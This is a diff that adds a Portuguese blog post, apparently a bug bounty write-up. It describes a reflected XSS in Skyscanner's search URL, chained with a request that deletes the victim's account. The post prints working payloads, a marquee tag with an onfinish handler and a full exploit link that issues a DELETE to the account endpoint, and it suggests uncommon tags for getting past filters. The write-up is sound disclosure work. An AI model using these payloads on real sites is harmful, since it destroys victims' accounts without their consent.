@@ -1,0 +1,117 @@
+---
+layout: post
+title:  "Bug Bounty 03 - Deleting User's Account via Reflected XSS chained with CSRF"
+date:   2019-10-03 11:08:00
+categories: All
+img: bug_bounty.png
+---
+<p align="justify">
+Salve rapaziada, no post de hoje irei falar sobre uma vulnerabilidade que encontrei no programa de bug bounty do <a href="https://bugcrowd.com/skyscanner" target="_blank">Skyscanner</a> na plataforma <a href="https://bugcrowd.com/" target="_blank">Bugcrowd</a>.
+</p>
+
+<p align="justify">
+Enquanto navegava pela aplicação, notei que ao fazer uma busca, haviam vários parâmetros sendo passados pelo método GET, similar a este resultado:
+</p>
+
+<p>
+<code>https://www.skyscanner.com.br/transporte/passagens-aereas/jpa/kef/190615/190622/?adults=1&children=0&adultsv2=1&childrenv2=&infants=0&cabinclass=economy&rtn=1&preferdirects=false&outboundaltsenabled=false&inboundaltsenabled=false&ref=home#results</code>
+<br>
+<br>
+</p>
+
+<p align="justify">
+Dei uma no código fonte e vi que o a URL não era refletida no código fonte da aplicação.
+<br>
+<br>
+Depois de pesquisar um pouco mais, notei que ao realizar uma busca por locais que não haviam viagens a URL era refletida no código. Utilizei o seguinte link para encontrar essa funcionalidade:
+</p>
+
+<p>
+<code>https://www.skyscanner.com.br/transporte/passagens-aereas/jpa/ad/190411/190418/?adults=1&children=0&adultsv2=1&childrenv2=&]infants=0&cabinclass=economy&rtn=1&preferdirects=false&outboundaltsenabled=false&inboundaltsenabled=false&ref=home&ampcurrency=BOB</code>
+<br>
+<br>
+<img src="/images/bug_bounty/bb03/bb03-00.png"/>
+</p>
+
+<p align="justify">
+Com isso, fui injetando algumas tags nos parâmetros e vendo se eles eram refletidos sem algum tipo de sanitização. Notei que ao inserir algo no parâmetro <i>ref</i> ele era refletido no código fonte e adivinhem... sem nenhum tipo de sanitização.
+<br>
+<br>
+Ao inserir determinados payloads, eu recebia um código 500 e a aplicação era redirecionada para uma página de erro.
+<br>
+<br>
+Depois de algumas tentativas, decidi inserir uma tag que já havia utilizado em outros programas de bug bounty:
+<br>
+<code>">&ltmarquee>rapt00r&lt/marquee></code>
+<br>
+<br>
+Esta tag cria uma espécie de painel (tipo aqueles painéis de LED que as letras ficam indo de uma ponta a outra do painel)
+<br>
+<br>
+E bingo!!! O nosso marquee foi adicionado com sucesso no código. Infelizmente não tirei print dessa parte e nem do código fonte pois fiquei muito animado ao ver que realmente funcionou :)
+</p>
+
+<p align="justify">
+Pesquisando um pouco mais sobre como utilizar a tag marquee, notei que ela suporta um evento JS chamado <i>onfinish</i>.
+<br>
+<br>
+Então, quando o marquee era finalizado, podíamos executar códigos Javascript. Infelizmente também esqueci de tirar print dessa parte :(
+<br>
+<br>
+Dependendo do tamanho do painel que era criado, demoraria muito para o banner finalizar. Então adicionei outros 2 atributos ao nosso marquee: <i>width</i> e <i>loop</i>, que servem para você definir o tamanho e o número de vezes que você quer que o banner apareça.
+</p>
+
+<p align="justify">
+Bom, nesse ponto nosso payload estava da seguinte forma:
+<br>
+<code>">&ltmarquee width=0 loop=1 onfinish="alert(1)">rapt00r&lt/marquee></code>
+<br>
+</p>
+
+<p>
+Agora, o link junto com o payload ficaria da seguinte forma:
+<code>https://www.skyscanner.com.br/transporte/passagens-aereas/jpa/ad/190411/190418/?adults=1&children=0&adultsv2=1&childrenv2=&]infants=0&cabinclass=economy&rtn=1&preferdirects=false&outboundaltsenabled=false&inboundaltsenabled=false&ref=home">&ltmarquee width=0 loop=1 onfinish="alert(1)">rapt00r&lt/marquee>&ampcurrency=BOB</code>
+</p>
+
+<p align="justify">
+E quando o usuário acessava, ele veria o alerta em sua tela :)
+</p>
+
+<p align="justify">
+Decidi então encadear com um CSRF para realizar o account takeover, mas infelizmente não havia a opção de troca de email (e para trocar a senha era necessário saber a senha antiga :/ )
+</p>
+
+<p align="justify">
+Sem perder as esperanças, notei que havia a opção de deletar a conta. Hmm, interessante...
+<br>
+<br>
+Para realizar a exclusão da conta era necessário enviar uma request (necessário que o usuário esteja autenticado) do tipo <i>DELETE</i> para o endpoint <i>/profile/user/delete-account</i> e a conta seria deletada.
+</p>
+
+<p align="justify">
+Para finalizar, irei deixar o código da requisição que utilizei no evento JS para realizar a exclusão da conta do usuário que visitasse o link:
+</p>
+
+<code>var request = new XMLHttpRequest();
+request.open('DELETE', 'https://www.skyscanner.com.br/profile/user/delete-account', false); 
+request.send();</code>
+
+<p align="justify">
+<br>
+E o link final para explorar a vulnerabilidade ficou da seguinte forma:
+</p>
+<p>
+<code>https://www.skyscanner.com.br/transporte/passagens-aereas/jpa/ad/190411/190418/?adults=1&children=0&adultsv2=1&childrenv2=&]infants=0&cabinclass=economy&rtn=1&preferdirects=false&outboundaltsenabled=false&inboundaltsenabled=false&ref=https://www.google.com"/> &ltmarquee loop=1 width=0 onfinish="var request = new XMLHttpRequest(); request.open('DELETE', 'https://www.skyscanner.com.br/profile/user/delete-account', false); request.send();">&lt/marquee>&ampcurrency=BOB</code>
+</p>
+
+<p align="justify">
+Como PoC desta vulnerabilidade, deixo um vídeo e vocẽs podem acessar pelo link:
+<br>
+<iframe width="560" height="315" src="https://www.youtube.com/embed/ZuyLvAPg-TQ" frameborder="0" allow="accelerometer; autoplay; encrypted-media; gyroscope; picture-in-picture" allowfullscreen></iframe>
+</p>
+
+<p align="justify">
+É isso aí galera, recomendo utilizar outras tags além do <i>iframe, img, script</i>, pode ser que vocês consigam dar esse "bypass" da mesma forma que eu acabei de mostrar :)
+</p>
+
+Valeuuu !!!
